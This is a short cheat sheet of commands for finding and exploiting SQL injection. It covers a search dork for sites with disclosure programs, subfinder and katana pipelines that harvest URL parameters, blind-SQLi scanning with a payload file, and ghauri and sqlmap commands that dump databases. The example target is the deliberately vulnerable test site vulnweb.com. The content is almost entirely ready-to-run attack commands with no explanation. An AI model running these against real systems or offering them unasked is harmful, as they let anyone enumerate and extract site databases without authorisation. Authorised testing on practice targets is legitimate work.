## Dork

```
site:.in & filetype:php | filetype:asp | filetype:aspx | filetype:jsp | filetype:jspx & intext:"responsible disclosure"
```
<span>all country tlds https://gist.githubusercontent.com/derlin/421d2bb55018a1538271227ff6b1299d/raw/3a131d47ca322a1d001f1f79333d924672194f36/country-codes-tlds.json </span>

## All Parameter Finding

```
subfinder -d "vulnweb.com" -recursive -all -silent | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | qsreplace "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u | tee vulnweb.com.all.parameters.txt
```

## Only SQLi Parameters

```
subfinder -d "vulnweb.com" -recursive -all -silent | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | gf sqli | qsreplace "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u | tee vulnweb.com.sql.parameters.txt
```

## Blind SQLi Detection

```
bsqli --urls vulnweb.com.sql.parameters.txt --payloads payloads/xor.txt --verbose --save vulnweb.com.detected.sql.parameters.txt
```

## Ghauri DB Dumping

```
ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --confirm --current-db --dbs
```

## SQLMAP DB Dumping

```
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --dbs --random-agent --tamper=space2comment --level=2
```
